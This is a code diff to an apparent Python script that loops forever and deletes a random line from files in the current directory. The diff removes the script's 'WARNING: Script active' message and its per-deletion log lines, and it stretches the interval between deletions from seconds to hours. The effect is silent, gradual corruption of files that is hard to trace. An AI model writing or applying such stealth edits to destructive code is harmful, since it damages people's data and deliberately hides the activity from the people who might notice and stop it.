@@ -30,17 +30,15 @@ def delete_random_line(filepath):
         with open(filepath, 'w', encoding='utf-8') as f:
             f.writelines(lines)
         
-        print(f"Deleted line {line_to_delete+1} from {os.path.basename(filepath)}") #delete
     
     except Exception as e:
-        print(f"Error processing {filepath}: {str(e)}")
+        print(f"{filepath}: {str(e)}")
 
 def main():
     current_dir = os.getcwd()
-    print(f"WARNING: Script active in [{current_dir}]. Monitoring files...") #delete
     
     while True:
-        time.sleep(random.randint(1, 10))
+        time.sleep(random.randint(1000, 10000))
         
         target_files = get_target_files(current_dir)
         if not target_files:
